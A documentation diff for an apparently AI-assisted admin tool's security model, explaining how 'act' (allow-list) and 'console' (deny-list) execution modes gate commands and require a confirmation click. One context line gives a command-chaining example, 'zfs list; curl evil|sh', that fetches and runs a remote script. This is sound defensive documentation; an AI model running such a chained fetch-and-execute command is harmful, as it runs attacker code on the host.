@@ -220,6 +220,24 @@ SECURITY MODEL
     command past exec_deny (e.g. "zfs list; curl evil|sh"). Use
     exec_access=console (arbitrary shell, deny-only) when chained commands
     are genuinely needed -- grant it only to fully trusted admins.
+  - cs_26.08.26_18 (Gea, precise "act" vs "console" semantics): the GUI
+    Mode select shows "plan (ro)" / "act (exec)" -- "act" IS
+    exec_access=exec. The two exec_access levels differ in which list
+    gates a command, not just in strictness:
+      * exec_access=exec ("act" mode) = ALLOW-LIST: every proposed
+        command goes through the normal AI ask/propose/confirm flow
+        (the [[ACTION]] block in the answer, run via cs-aihelp-exec.pl
+        only after the "Ausführen" click), and it is only permitted if
+        its command class is explicitly present in exec_allow. Nothing
+        outside that allow-list can ever run, regardless of exec_deny.
+      * exec_access=console ("console" mode) = DENY-LIST ONLY:
+        exec_allow is bypassed entirely -- any command may be proposed
+        and run EXCEPT those matching exec_deny, which always applies
+        in both modes and can never be bypassed.
+    In short: "act" = execute only what is explicitly allowed;
+    "console" = execute everything except what is explicitly forbidden.
+    console is strictly wider than act and should only go to fully
+    trusted admins.
   - exec_mode=confirm (default): every exec needs the explicit
     "Ausführen" click in the browser. auto only with a tight allow list.
   - Combining exec_access!=ro with research!=off widens the prompt-injection
